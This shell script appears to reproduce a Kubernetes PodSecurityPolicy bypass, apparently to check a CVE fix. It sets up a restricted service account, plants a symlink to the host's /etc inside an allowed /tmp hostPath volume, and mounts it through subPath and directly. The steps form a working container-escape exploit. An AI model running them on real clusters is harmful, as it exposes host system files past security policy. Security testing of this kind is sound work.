# SETUP KUBE NAMESPACE, SA, ROLE, RBAC
echo "SETUP KUBE NAMESPACE, SA, ROLE, RBAC"
kubectl create namespace psp-example
kubectl create serviceaccount -n psp-example fake-user
kubectl create rolebinding -n psp-example fake-editor --clusterrole=edit --serviceaccount=psp-example:fake-user
alias kubectl-admin='kubectl -n psp-example'
alias kubectl-user='kubectl --as=system:serviceaccount:psp-example:fake-user -n psp-example'

cat <<EOF | kubectl-admin create -f -
apiVersion: extensions/v1beta1
kind: PodSecurityPolicy
metadata:
  name: example
spec:
  privileged: false
  seLinux:
    rule: RunAsAny
  supplementalGroups:
    rule: RunAsAny
  runAsUser:
    rule: RunAsAny
  fsGroup:
    rule: RunAsAny
  volumes:
  - '*'
  allowedHostPaths:
  - pathPrefix: "/tmp"
EOF

kubectl-user create -f- <<EOF
apiVersion: v1
kind: Pod
metadata:
  name:      pause
spec:
  containers:
    - name:  pause
      image: k8s.gcr.io/pause
EOF
echo "SHOULD FAIL: NO PSP IN KUBE"
kubectl-user auth can-i use podsecuritypolicy/example

echo "  "
echo "Create RoleBinding serviceaccount=psp-example:fake-user --> use podsecuritypolicy example"
kubectl-admin create role psp:unprivileged \
    --verb=use \
    --resource=podsecuritypolicy \
    --resource-name=example
kubectl-admin create rolebinding fake-user:psp:unprivileged \
    --role=psp:unprivileged \
    --serviceaccount=psp-example:fake-user
    
echo "  "
echo "TEST PSP: SHOULD BE DENIED. -- Create a Pod with Volumn mount from host path /etc"
cat <<EOF | kubectl-user create -f -
apiVersion: v1
kind: Pod
metadata:
  name: psp-test-container
spec:
  containers:
  - image: alpine
    name: psp-test-container
    volumeMounts:
    - mountPath: /vol
      name: host-volume1
    command: ["sleep"]
    args: ["1000"]
  volumes:
  - name: host-volume1
    hostPath:
      path: /etc
EOF

echo "  "
echo "Create Pod {vuln-container1} (with Volumn mount from host path {/tmp/test/} to {/vol/} in Pod)"
cat <<EOF | kubectl-user create -f -
apiVersion: v1
kind: Pod
metadata:
  name: vuln-container1
spec:
  containers:
  - image: alpine
    name: vuln-container1
    volumeMounts:
    - mountPath: /vol
      name: host-volume1
    command: ["sleep"]
    args: ["1000"]
  volumes:
  - name: host-volume1
    hostPath:
      path: /tmp/test
EOF

echo "Create a Symbolic link {/vol/sym} (links to {/etc})"
kubectl-user exec -it vuln-container1 /bin/sh
ln -s /etc /vol/sym

echo "  "
echo "Create Pod {vuln-container2} (with Volumn mount using [subpath] {/sym} to {/vol/} in Pod)"
echo "!! should be fail due to the CVE fix !!"
cat <<EOF | kubectl-user create -f -
apiVersion: v1
kind: Pod
metadata:
   name: vuln-container2
spec:
   containers:
   - image: alpine 
     name: vuln-container2
     volumeMounts:
     - mountPath: /vol
       name: host-volume2
       subPath: sym
     command: ["sleep"]
     args: ["1000"]
   volumes:
   - name: host-volume2
     hostPath:
       path: /tmp/test
EOF

echo "  "
echo "Create Pod {vuln-container3} (with Volumn mount from {/tmp/test/sym} to {/vol/} in Pod)"
cat <<EOF | kubectl-user create -f -
apiVersion: v1
kind: Pod
metadata:
  name: vuln-container3
spec:
  containers:
  - image: alpine
    name: vuln-container3
    volumeMounts:
    - mountPath: /vol
      name: host-volume3
    command: ["sleep"]
    args: ["1000"]
  volumes:
  - name: host-volume3
    hostPath:
      path: /tmp/test/sym
EOF

echo " --> Check whether host's {/etc} folder is mount to {/vol} folder in the pod"
kubectl exec -it vuln-container3 ls vol

echo "  "
echo "Directly Mount host's {/etc} folder to {/vol} folder in the pod --> Should Fail Due to PodSecurityPolicy"
cat <<EOF | kubectl-user create -f -
apiVersion: v1
kind: Pod
metadata:
  name: vuln-container4
spec:
  containers:
  - image: alpine
    name: vuln-container4
    volumeMounts:
    - mountPath: /vol
      name: host-volume4
    command: ["sleep"]
    args: ["1000"]
  volumes:
  - name: host-volume4
    hostPath:
      path: /etc
EOF
